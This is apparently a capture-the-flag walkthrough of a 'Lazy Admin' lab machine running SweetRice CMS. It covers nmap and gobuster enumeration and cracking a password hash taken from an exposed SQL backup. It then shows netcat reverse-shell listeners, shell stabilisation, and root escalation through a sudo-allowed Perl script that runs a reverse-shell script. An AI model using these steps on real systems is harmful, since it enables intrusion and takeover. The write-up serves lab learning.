```bash
nmap -sC -sV -p- 10.10.144.189 --open
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 20:13 UTC
Nmap scan report for 10.10.144.189
Host is up (0.072s latency).
Not shown: 65499 closed tcp ports (reset), 34 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](/assets/img-8.png)


```bash
gobuster dir -u http://10.10.133.82 -w /usr/share/wordlists/dirb/common.txt
```

Found : `content` 

```url
http://10.10.144.189/content
```

```bash
gobuster dir -u http://10.10.133.82/content -w /usr/share/wordlists/dirb/common.txt
```

Interesting Founds : `ac` & `inc`

![](/assets/img-9.png)

![](/assets/img-10.png)


```bash
cat mysql_bakup_20191129023059-1.5.1.sql
```

```
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195.........\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

```bash
username 1 : admin 
username 2 : manager   
Found Something : 42f749ade7f9e195.........
```

Using Hash identifier:

```bash
hash-identifier 42f749ade7f9e195.........
```

![](/assets/img-11.png)

Let's Try to break

![](/assets/img-12.png)


```
username : manager
password : ....
```

Let's Try To login:

![](/assets/img-13.png)

---

## **Let's Create Reverse Shell :**

![](/assets/img-14.png)

![](/assets/img-15.png)

![](/assets/img-16.png)


```bash
nc -lnvp 5555
```

Success Reverse Shell:

![](/assets/img-17.png)


```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

ctrl + z


```bash
stty raw -echo; fg
```

Enter

---

### **Privilege Escalation :**

![](/assets/img-17.png)

```bash
cat /home/itguy/backup.pl
```

![](/assets/img-19.png)

The Perl Command execute This Command: `sh /etc/copy.sh` as `root`

There is a Reverse Shell in `copy.sh`
change the IP to Your Machine & execute Run the `nc`:

```bash
nc -lnvp 5554
```

```bash
sudo /usr/bin/perl /home/itguy/backup.pl 
```
![](/assets/img-20.png)
